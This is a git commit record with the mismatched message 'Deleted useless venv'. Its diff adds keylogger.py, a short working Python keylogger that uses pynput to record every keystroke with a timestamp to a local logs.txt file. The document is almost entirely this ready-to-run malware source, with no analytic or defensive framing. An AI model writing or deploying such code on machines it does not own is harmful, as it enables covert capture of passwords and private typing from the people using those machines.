01a05fddc5b0f66831fc64f40e55c3507cbc7a2e
numbersanalyst <mrgregorybrzeczyszczykiewicz@proton.me>
2023-08-13 14:49:55 +0200

    Deleted useless venv

---
+++ keylogger.py
@@ -0,0 +1,17 @@
+from pynput import keyboard
+import logging
+
+logging.basicConfig(
+    filename='logs.txt',
+    level=logging.DEBUG,
+    format='%(asctime)s - %(message)s',
+    datefmt='%d-%b-%Y %H:%M:%S',
+    encoding='utf-8')
+
+
+def key_pressed(key):
+    logging.debug(str(key))
+
+
+with keyboard.Listener(on_press=key_pressed) as listener:
+    listener.join()
